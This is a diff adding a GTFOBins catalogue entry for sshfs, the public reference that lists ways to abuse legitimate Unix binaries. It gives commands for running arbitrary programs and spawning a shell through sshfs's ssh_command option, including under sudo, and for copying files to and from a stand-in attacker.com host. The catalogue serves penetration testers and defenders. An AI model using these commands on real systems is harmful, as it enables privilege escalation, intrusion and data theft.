@@ -1,0 +1,35 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/sshfs -->
+---
+functions:
+  command:
+  - blind: true
+    code: |-
+      sshfs -o ssh_command=/path/to/command x: /path/to/dir/
+    contexts:
+      sudo:
+      unprivileged:
+  download:
+  - code: |-
+      sshfs user@attacker.com:/ /path/to/dir/
+      cp /path/to/dir/path/to/input-file /path/to/output-file
+    contexts:
+      unprivileged:
+    sender: ssh-server
+  shell:
+  - code: |-
+      echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
+    comment: |-
+      The mount dir must be writable by the invoking user.
+    contexts:
+      sudo:
+      unprivileged:
+  upload:
+  - code: |-
+      sshfs user@attacker.com:/ /path/to/dir/
+      cp /path/to/input-file /path/to/dir/
+    contexts:
+      unprivileged:
+    receiver: ssh-server
+...
